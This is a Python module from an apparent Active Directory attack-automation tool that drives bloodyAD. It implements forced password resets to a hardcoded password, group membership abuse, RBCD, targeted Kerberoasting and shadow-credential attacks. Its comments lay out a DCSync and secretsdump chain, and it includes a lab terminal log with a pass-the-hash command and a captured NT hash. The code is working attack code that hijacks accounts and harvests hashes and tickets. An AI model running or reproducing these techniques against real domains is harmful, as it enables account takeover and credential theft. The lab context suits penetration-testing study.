# services/ldap_techniques.py
from services.printing import print_done
from entities.exploit_result import ExploitResult
from entities.credentials import Credential
from exceptions.hop_failed_error import HopFailedError
from strategies.bloodyad_base import HARDCODED_PASSWORD

import re

"""
│   ├── ldap_techniques.py       ← bloodyAD writes
│   │   ├── _do_force_change_password
│   │   ├── _do_add_member
│   │   ├── _do_rbcd
│   │   ├── _do_shadow_credentials
│   │   ├── _do_targeted_kerberoast
│   │   ├── _do_grant_dcsync (????)
│   │   └── _do_take_ownership

LDAP writes via bloodyAD : Privilege escalation via directory manipulation
LDAP (Lightweight Directory Access Protocol): language to talk to a directory
Everything is stored in a big hierarchical database. LDAP is used to 
- read data (query users, groups, permissions) 
- and write data (modify attributes, memberships, ACLs)
bloodyAD is a tool that performs LDAP write operations against AD.
- It doesn't exploit memory or Kerberos directly but modifies AD objects

Techniques : TODO: make them into an enum
1. ForceChangePassword : modify unicodePwd without knowing the old one
- (User / Group / Computer) --> User
- Permission needed: CONTROL_ACCESS with User-Force-Change-Password extended right
- Downside: Very loud — the user notices immediately when they can't log in.
2. AddMember
- (User / Group) --> Group
- Permission needed: WRITE_PROP on member attribute, OR WRITE_VALIDATED with Self-Membership
3. RBCD (Resource-Based Constrained Delegation) : modifies msDS-AllowedToActOnBehalfOfOtherIdentity
- One machine impersonates users to another machine
- (User / Group / Computer) --> Computer
4. Shadow Credentials
- (User / Group / Computer) --> User
- Stealthy: Doesn't change the password
- Permission needed: WRITE_PROP on msDS-KeyCredentialLink
(
Attacker → adds fake certificate entry → msDS-KeyCredentialLink on target
         → requests Kerberos TGT using that certificate (PKINIT)
         → authenticates AS the target
)
5. TakeOwnership : modify owner field in nTSecurityDescriptor (owner --> full control)
- (User / Group / Computer) --> Base
( TakeOwnership → become owner
→ modify DACL → give yourself GenericAll
→ full control)
6. GrantDCSync : Domain object DACL, add rights GetChanges & GetChangesAll
- replicate hashed passwords from DC
- (User / Group) --> Domain
7. TargeteKerberoast : modifies servicePrincipalName (SPN)
- requests a kerberos ticket, cracks it and recovers password of the target
- (User / Group) --> User
- Permission needed: WRITE_PROP on servicePrincipalName (in Public-Information property set)

Security Principals = User + Group + Computer
Every object has a DACL (Discretionary Access Control List). It contains ACEs (rules).

NOO GRANT DCSYNC comes from WRITE_OWNER
You have WRITE_OWNER on target
    ↓
You set yourself as owner of that object
    ↓
Owner implicitly gets WRITE_DACL
    ↓
Now you can modify the DACL (give yourself GenericAll)
MATCH p=(:Base)-[:Owns]->(:Base)
RETURN p LIMIT 25

-- or
MATCH p=(:Base)-[:WriteOwner]->(:Base)
RETURN p LIMIT 25
You have WRITE_DACL on the Domain object
    ↓
You add two ACEs to the domain DACL:
  - DS-Replication-Get-Changes
  - DS-Replication-Get-Changes-All
    ↓
Now your user can replicate like a DC
    ↓
Run secretsdump → get all hashes
"""

class ADTechniquesMixin:
    """
    Techniques that write to AD via LDAP (bloodyAD).
    Requires: self.edge, self.attacker, self.target, self._run_bloodyad()
    """
    # ──────────────────────────────────────────────────
    # Force Change Password
    # ──────────────────────────────────────────────────
    def _do_force_change_password(self, creds: dict) -> ExploitResult:
        target_sam = self.target.sam()
        new_password = HARDCODED_PASSWORD

        self._run_bloodyad(
            creds,
            ["set", "password", target_sam, new_password],
            "ForceChangePassword"
        )

        print_done(f"Password changed for {target_sam} → {new_password}")
        return ExploitResult(
            technique="ForceChangePassword",
            edge=self.edge,
            success=True,
            notes=(
                f"Password reset for {target_sam}\n"
                f"Username: {target_sam}\n"
                f"Password: {new_password}\n"
                f"Domain: {creds['domain']}"
            ),
            gained_access=Credential(
                username=target_sam,
                password=new_password,
                domain=creds.get("domain"),
                dc_ip=creds.get("dc_ip"),
            ),
        )

    # ──────────────────────────────────────────────────
    # Add Member
    # ──────────────────────────────────────────────────
    def _do_add_member(self, creds: dict) -> ExploitResult:
        group_sam = self.target.sam()
        member_sam = self.attacker.sam()

        try:
            self._run_bloodyad(
                creds,
                ["add", "groupMember", group_sam, member_sam],
                "AddMember"
            )
        except HopFailedError as e:
            error_msg = str(e)
            if "entryAlreadyExists" in error_msg or "already a member" in error_msg:
                print_done(f"{member_sam} already a member of {group_sam} — OK")
                return ExploitResult(
                    technique="AddMember",
                    edge=self.edge,
                    success=True,
                    notes=f"{member_sam} already a member of {group_sam} (idempotent)",
                )
            raise  # re-raise if it's a different error

        print_done(f"{member_sam} added to {group_sam}")
        return ExploitResult(
            technique="AddMember",
            edge=self.edge,
            success=True,
            notes=f"{member_sam} added to {group_sam}",
        )

    # ──────────────────────────────────────────────────
    # Targeted Kerberoast
    # ──────────────────────────────────────────────────
    def _do_targeted_kerberoast(self, creds: dict) -> ExploitResult:
        target_sam = self.target.sam()
        fake_spn = f"fake/roast.{creds['domain']}"

        self._run_bloodyad(
            creds,
            ["set", "object", target_sam, "servicePrincipalNames", fake_spn],
            "TargetedKerberoast"
        )

        print_done(f"SPN set on {target_sam}: {fake_spn}")
        return ExploitResult(
            technique="TargetedKerberoast",
            edge=self.edge,
            success=True,
            notes=f"SPN {fake_spn} added to {target_sam}; ready for Kerberoasting",
        )

    # ──────────────────────────────────────────────────
    # RBCD
    # ──────────────────────────────────────────────────
    def _do_rbcd(self, creds: dict) -> ExploitResult:
        target_sam = self.target.sam()
        attacker_sam = self.attacker.sam()

        self._run_bloodyad(
            creds,
            ["add", "rbcd", target_sam, attacker_sam],
            "RBCD"
        )

        print_done(f"RBCD set: {attacker_sam} → {target_sam}")
        return ExploitResult(
            technique="RBCD",
            edge=self.edge,
            success=True,
            notes=f"RBCD configured: {attacker_sam} can impersonate against {target_sam}",
        )
    
    # ──────────────────────────────────────────────────
    # Shadow Credentials
    # ──────────────────────────────────────────────────

    """
    bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> add shadowCredentials <target_sam>
    rania@DELL:/mnt/c/Users/dell precision$ bloodyAD --host 192.168.56.10 -d sevenkingdoms.local -u lord.varys -p :52ff2a79823d81d6a3f4f8261d7acc59 add shadowCredentials robert.baratheon
    [+] KeyCredential generated with following sha256 of RSA key: 71c9301f8043acb4ca030c123906b5b1ec3526343b1ef70d92ae3b65a632a68c
    [+] TGT stored in ccache file robert.baratheon_WS.ccache

    NT: 9029cf007326107eb1c519c84ea60dbe
    rania@DELL:/mnt/c/Users/dell precision$
    """
    def _do_shadow_credentials(self, creds: dict) -> ExploitResult:
        target_sam = self.target.sam()

        output = self._run_bloodyad(
            creds,
            ["add", "shadowCredentials", target_sam],
            "ShadowCredentials"
        )

        """
        The output gives you the NT hash and the ccache path,
          not a password. So you should parse
            those and use hash and ticket fields instead.
        """

        parsed = self._parse_shadow_credentials_output(output)
        nt_hash = parsed.get("nt_hash","")
        ccache = parsed.get("ccache","")

        if not nt_hash and not ccache:
            raise HopFailedError(
                "ShadowCredentials",
                "bloodyAD ran but could not parse NT hash or ccache from output"
            )

        print_done(f"Shadow Credentials set on {target_sam} → NT: {nt_hash}")
        return ExploitResult(
            technique="ShadowCredentials",
            edge=self.edge,
            success=True,
            notes=(
                f"PShadow credentials added to {target_sam}\n"
                f"Username : {target_sam}\n"
                f"NT Hash  : {nt_hash}\n"
                f"TGT      : {ccache}\n"
                f"Domain   : {creds['domain']}"
            ),
            gained_access=Credential(
                username=target_sam,
                hash=f":{nt_hash}",   # :hash format for pass-the-hash tools
                ticket=ccache,        # ccache path for Kerberos tools
                domain=creds.get("domain"),
                dc_ip=creds.get("dc_ip"),
            ),
        )
    
    def _parse_shadow_credentials_output(self, output: str) -> dict:
        result = {}
        
        # NT hash: "NT: 9029cf007326107eb1c519c84ea60dbe"
        nt_match = re.search(r"NT:\s*([a-fA-F0-9]{32})", output)
        if nt_match:
            result["nt_hash"] = nt_match.group(1)
        
        # ccache path: "TGT stored in ccache file robert.baratheon_WS.ccache"
        ccache_match = re.search(r"TGT stored in ccache file (.+\.ccache)", output)
        if ccache_match:
            result["ccache"] = ccache_match.group(1).strip()
        
        return result